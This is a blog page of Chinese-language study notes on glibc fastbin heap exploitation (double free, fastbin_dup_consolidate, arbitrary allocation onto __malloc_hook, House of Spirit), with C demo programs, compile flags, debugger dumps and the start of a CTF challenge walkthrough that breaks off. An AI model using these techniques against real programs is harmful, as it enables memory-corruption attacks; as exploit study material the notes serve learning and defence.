<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="zach0ry">
    
    <title>
        
            bin |
        
        b1nary
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/fire.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                  || fa-solid fa-tags","categories":"/categories      || fa-solid fa-layer-group"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":null,"enable":true,"level_badge":true,"custom_badge":["炼气","筑基","结丹","元婴","化神","渡劫","大乘"],"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/fire.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               b1nary
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
                                
                                HOME
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                
                                ARCHIVES
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
                                
                                TAGS
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-layer-group"></i>
                                
                                CATEGORIES
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
                                </span>
                            
                            HOME
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                </span>
                            
                            ARCHIVES
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
                                </span>
                            
                            TAGS
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-layer-group"></i>
                                </span>
                            
                            CATEGORIES
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        bin
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/author.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">zach0ry</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-11-10</span>
            </span>

            
                <span class="meta-info-item post-update-date">
                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                    <span class="datetime" data-updated="Mon Feb 09 2026 10:51:22 GMT+0800">2026-02-09</span>
                </span>
            
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/pwn-study/">pwn_study</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/heap/">heap</a></li>
                        
                    
                </ul>
            </span>
        

        
        
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h2><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。</p>
<h3 id="double-free"><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h3><p> fastbin 的 chunk 可以被多次释放</p>
<p>当执行 <code>free(p)</code>：</p>
<ol>
<li>glibc 会先确定这个 chunk 属于哪个 arena</li>
<li>找到对应大小的 fastbin 链表</li>
<li>检查 <strong>头部块</strong>（<code>main_arena.fastbinsY[idx]</code>）是否等于当前要释放的块 <code>p</code>（防止简单的 double free）。</li>
<li>如果没问题，就把 <code>p</code> 插入到链表头,也就是让它成为 <code>main_arena.fastbinsY[idx]</code> 的新头节点。</li>
</ol>
<p>但是——它<strong>不会沿着整个链表检查后面的节点</strong>，所以如果链表后面已经有一个同样地址的块（双重释放形成重复节点），glibc 在 fastbin 阶段是<strong>察觉不到的</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* Another simple check: make sure the top of the bin is not the</span><br><span class="line">       record we are going to add (i.e., double free).  */</span><br><span class="line">    if (__builtin_expect (old == p, 0))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = &quot;double free or corruption (fasttop)&quot;;</span><br><span class="line">        goto errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p>先malloc一个再free掉，再malloc一个大的会唤起consolidate，把chunk放入之后再malloc会拿到那个指针</p>
<p>malloc_consolidate</p>
<p>典型触发点有几种：</p>
<ul>
<li>有一次 <strong>大尺寸分配</strong>（通常请求 &gt;&#x3D; 某阈值，比如历史上是 0x400 对应 chunk size 0x410），malloc 在 slow-path 中为了寻找大块会先调用 consolidate 以把 fastbin 中块变成可合并的大块供分配使用。</li>
<li>释放（free）时，如果释放操作必须合并或处理非 fastbin 情形，也可能触发 consolidate（实现差异会影响何时调用）。</li>
<li>某些内部一致性&#x2F;回收路径也会调用它来把 fastbin 清空。</li>
</ul>
<p>执行流程</p>
<p>从fastbin中取出一个空闲chunk，尝试向后合并</p>
<p>如果不可以就向前合并，如果与top_chunk相邻就直接归入top_chunk</p>
<p>不相邻就插入unsorted_bin中，然后继续从fast_bin中取chunk，直到该链表为空</p>
<blockquote>
<p><strong>fastbin push（free 的 fast-path）</strong></p>
<ul>
<li>不会做合并、也<strong>不会修改被释放 chunk 的 size 字段</strong>。</li>
<li>会把 chunk 的第一个用户 qword（在 fd 存放位置）写成原来 fastbin 头（<code>p-&gt;fd = fb_head</code>），并把 <code>arena-&gt;fastbinsY[idx] = p</code>。</li>
<li>不会去读&#x2F;写 <code>next_chunk</code> 的头部（也就不清 <code>next_chunk</code> 的 PREV_INUSE）。</li>
<li>目标是最小写操作（性能优先）。</li>
</ul>
<p><strong>malloc_consolidate（slow-path）</strong></p>
<ul>
<li>会把 fastbin 中的节点一个个 pop 出来，<strong>在把它们带入主 bin &#x2F; 合并前</strong>会对邻居做修正与检查。</li>
<li>其中一个必要操作是<strong>清除 next_chunk-&gt;PREV_INUSE 位</strong>，这个操作实质上是对 <code>next_chunk-&gt;size</code> 的写（因为 PREV_INUSE 存在于 size 字段的最低位）。</li>
<li>所以虽然 fast-path 不修改 size，但 consolidate 会修改 <em>下一个 chunk 的 size</em> 的低位（PREV_INUSE），以表示前驱已 free，从而允许合并。</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1 = calloc(1,0x40);</span><br><span class="line"> 	free(p1);</span><br><span class="line"> 	p3 = malloc(0x400);</span><br><span class="line"> 	free(p1)</span><br><span class="line"> 	p4 = malloc(0x400);</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1 = calloc(1,0x40);</span><br><span class="line"> 	free(p1);</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110181812158.png"  alt="image-20251110181812158"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p3 = malloc(0x400);</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110181840453.png"  alt="image-20251110181840453"></p>
<p>那个fastbin被合并进top_chunk,然后再从top_chunk开辟处0x400的空间</p>
<p>所以两个地方的指针相同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(p1)</span><br></pre></td></tr></table></figure>



<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110182238614.png"  alt="image-20251110182238614"></p>
<p>p1，p3指向相同，所以通过p1可以free掉p3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4 = malloc(0x400);</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110182458917.png"  alt="image-20251110182458917"></p>
<h3 id="fastbin-dup-into-stack-Arbitrary-Alloc"><a href="#fastbin-dup-into-stack-Arbitrary-Alloc" class="headerlink" title="fastbin_dup_into_stack&amp;&amp;Arbitrary Alloc"></a>fastbin_dup_into_stack&amp;&amp;Arbitrary Alloc</h3><p>这两个技术十分相似，都是篡改fd指针指向伪造的chunk，而第二种技术相对来说，涵盖了第一种，我们直接简绍第二种</p>
<p>事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    void *chunk1;</span><br><span class="line">    void *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1=malloc(0x60);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    *(long long *)chunk1=0x7ffff7dd1af5-0x8;</span><br><span class="line">    malloc(0x60);</span><br><span class="line">    chunk_a=malloc(0x60);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。**</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line">0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0</span><br></pre></td></tr></table></figure>

<p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure>

<p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0</span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f</span><br></pre></td></tr></table></figure>

<p>因为 0x7f 在计算 fastbin index 时(64位)，是属于 index 5 的，即 chunk 大小为 0x70 的。</p>
<p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line"> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line"> $rax   : 0x7ffff7dd1afd</span><br><span class="line"></span><br><span class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f</span><br><span class="line">0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f</span><br><span class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000</span><br><span class="line">0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>



<h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><p>伪造一个假的堆块（Fake Chunk），并让 malloc&#x2F;free 把它当成合法块处理，从而控制 fastbin 链表。</p>
<p>利用条件：</p>
<ol>
<li>在目标地址周围能够伪造一个堆块。</li>
<li>能对伪造堆块地址周围进行一次释放（即将伪造的堆块地址作为free函数的参数进行一次释放操作）</li>
<li>释放之后能够重新申请得到这个堆块并篡改目标地址的内容</li>
</ol>
<ul>
<li><p>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</p>
</li>
<li><p>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</p>
</li>
<li><p>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</p>
</li>
<li><p>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p>
</li>
<li><p>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。因为会检查下一个chunk的size字段，如果下一个chunk的字段不在正常范围内会报错退出，所以在伪造chunk的时候。</p>
</li>
<li></li>
<li><pre><code>if` `(__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))  ``//大于一个header
             ``&lt;= 2 * SIZE_SZ, 0)``//SIZE_SZ是系统单位字节数
    ``|| __builtin_expect (chunksize (chunk_at_offset (p, size))  
               ``&gt;= av-&gt;system_mem, 0))
   ``&#123;
    ``bool` `fail = ``true``;
    ``/* We might not have a lock at this point and concurrent modifications
      ``of system_mem might result in a false positive. Redo the test after
      ``getting the lock. */
    ``if` `(!have_lock)
     ``&#123;
      ``__libc_lock_lock (av-&gt;mutex);
      ``fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= 2 * SIZE_SZ
          ``|| chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);
      ``__libc_lock_unlock (av-&gt;mutex);
     ``&#125;
    ``if` `(fail)
     ``malloc_printerr (``&quot;free(): invalid next size (fast)&quot;``);
   ``&#125;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;**`free()`要读取并验证 next-&gt;size**</span><br><span class="line">&gt; `free(p)` 不仅看 `p` 的头，而是会访问 `p` 之后的 chunk 的头部来判断是否可以合并、判断大小是否在合理范围内、判断该 header 是否越界等。若 next-&gt;size 字段看起来“荒唐”（比如非常小或非常大），就会认为堆已损坏并 abort。</span><br><span class="line">&gt;</span><br><span class="line">&gt;**防止向前合并（consolidation）**</span><br><span class="line">&gt; 如果 next chunk 的头表明前一块是空闲（`PREV_INUSE` 标志不正确），或者 next chunk 的 size 表示它是 top/chunkpool 的一部分，`free()` 会尝试合并或作特殊处理。为了**让 allocator 不去合并或不触发其它异常路径**，伪造的块需要让 next chunk 的头看起来“逻辑上正确”——典型做法是把 next-&gt;size 标为一个合规大小并且把 PREV_INUSE 置位，表明“上一个块（即我们伪造的块）是被占用/符合预期”，从而避免合并。</span><br><span class="line">&gt;</span><br><span class="line">&gt;**绕过大小/arena 检查**</span><br><span class="line">&gt; 新版本 glibc 会检查 chunk size 是否在 arena 可接受的范围（与 `av-&gt;system_mem`、最小块大小等比较）。如果 next-&gt;size 不在允许范围，`free()` 会报错。用 House of Spirit 时必须让 next-&gt;size 看起来既不“太小”也不“太大”，并满足对齐与标志位规则。</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;time.h&gt;<br>#include &lt;unistd.h&gt;</p>
<p>void init() {<br>	setvbuf(stdout, 0, 2, 0);<br>	setvbuf(stdin, 0, 1, 0);<br>	setvbuf(stderr, 0, 1, 0);<br>}</p>
<p>long long data[0x20] &#x3D; {0};</p>
<p>int main(){	<br>	int size &#x3D; 0x70;<br>	void *p;<br>	init();</p>
<pre><code>malloc(0);	// fake chunk header

printf(&quot;%p\n&quot;,data);
data[0] = 0x0;
data[1] = size | 1; // prev_inuse_bit

data[size / 8] = 0x0;// fake next chunk header
data[(size / 8) + 1] = 0x11;
sleep(0);
// free user data place, fd.
free(&amp;data[2]);
sleep(0);
// user&#39;s size == chunk_size - 0x10
p = malloc(size - 0x10);
printf(&quot;%p\n&quot;,p);
sleep(0);
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">编译</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>gcc -Wl,-z,lazy -no-pie -z noexecstack -fno-stack-protector House_of_Spirit.c -o House_of_Spirit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">执行输出</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>0x6010a0<br>0x6010b0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第一个sleep处</span><br><span class="line"></span><br><span class="line">&lt;img   src=&quot;https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111190557676.png&quot;  alt=&quot;image-20251111190557676&quot; style=&quot;zoom:67%;&quot; &gt;![image-20251111190754042](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111190754042.png)</span><br><span class="line"></span><br><span class="line">第二次sleep,伪造的chunk会被放入bin链中</span><br><span class="line"></span><br><span class="line">![image-20251111190842480](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111190842480.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 例Arbitrary Alloc</span><br><span class="line"></span><br><span class="line">[例题](https://ctf.show/challenges#pwn144-4163)</span><br><span class="line"></span><br><span class="line">![image-20251110215048591](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110215048591.png)</span><br><span class="line"></span><br><span class="line">add</span><br><span class="line"></span><br><span class="line">![image-20251110215135839](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110215135839.png)</span><br><span class="line"></span><br><span class="line">edit</span><br><span class="line"></span><br><span class="line">自定义输入，存在堆溢出</span><br><span class="line"></span><br><span class="line">![image-20251110215205315](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110215205315.png)</span><br><span class="line"></span><br><span class="line">free</span><br><span class="line"></span><br><span class="line">指针置零</span><br><span class="line"></span><br><span 